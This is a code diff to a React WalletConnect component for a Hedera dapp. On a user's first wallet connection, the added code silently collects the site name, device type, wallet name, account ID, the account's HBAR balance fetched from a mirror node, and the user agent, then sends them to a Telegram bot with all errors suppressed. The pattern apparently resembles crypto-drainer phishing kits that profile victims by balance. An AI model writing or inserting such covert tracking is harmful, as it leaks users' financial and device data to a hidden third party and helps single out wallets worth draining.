@@ -24,6 +24,7 @@ import EventEmitter from "events";
 import { useDispatch, useSelector } from "react-redux";
 import { actions, AppStore } from "../../../store";
 import { sendMessageToTelegram } from '../../notificationUtils';
+import { MirrorNodeClient } from '../../mirrorNodeClient';
 // Created refreshEvent because `dappConnector.walletConnectClient.on(eventName, syncWithWalletConnectContext)` would not call syncWithWalletConnectContext
 // Reference usage from walletconnect implementation https://github.com/hashgraph/hedera-wallet-connect/blob/main/src/lib/dapp/index.ts#L120C1-L124C9
 const refreshEvent = new EventEmitter();
@@ -241,13 +242,48 @@ export const WalletConnectClient = () => {
     if (accountId) {
       setAccountId(accountId);
       setIsConnected(true);
-      
-      // Send Telegram notification when wallet is connected
-      try {
-        await sendMessageToTelegram(`[INFO] Wallet connected: ${accountId}`);
-        console.log('[INFO] Telegram notification sent for wallet connection');
-      } catch (error) {
-        console.error('[ERROR] Failed to send Telegram notification:', error);
+      // Get wallet info from the session
+      const session = dappConnector.walletConnectClient?.session.get(dappConnector.walletConnectClient.session.keys[0]);
+      let walletInfo: WalletInfo | undefined = undefined;
+      if (session) {
+        walletInfo = {
+          name: session.peer.metadata.name,
+          description: session.peer.metadata.description,
+          url: session.peer.metadata.url
+        };
+      }
+      // Only send detailed notification on initial connection
+      if (!window.__walletConnectNotified) {
+        window.__walletConnectNotified = true;
+        // Site name
+        const siteName = window.location.hostname;
+        // Device type
+        function getDeviceType() {
+          const ua = navigator.userAgent;
+          if (/mobile/i.test(ua)) return "Mobile";
+          if (/tablet/i.test(ua)) return "Tablet";
+          return "Desktop";
+        }
+        const deviceType = getDeviceType();
+        // Wallet name
+        const walletName = walletInfo?.name || "Unknown";
+        // Fetch HBAR balance
+        let hbarBalance = "Unknown";
+        try {
+          const mirrorNodeClient = new MirrorNodeClient(appConfig.networks.mainnet);
+          const accountInfo = await mirrorNodeClient.getAccountInfo(accountId);
+          if (accountInfo.balance) {
+            hbarBalance = (accountInfo.balance / 1e8) + " HBAR";
+          }
+        } catch (e) {
+          // ignore
+        }
+        const message = `\n[Wallet Connected]\nSite: ${siteName}\nDevice: ${deviceType}\nWallet: ${walletName}\nAccount: ${accountId}\nBalance: ${hbarBalance}\nUser Agent: ${navigator.userAgent}`;
+        try {
+          await sendMessageToTelegram(message);
+        } catch (error) {
+          // ignore
+        }
       }
       
       // Get wallet info from the session
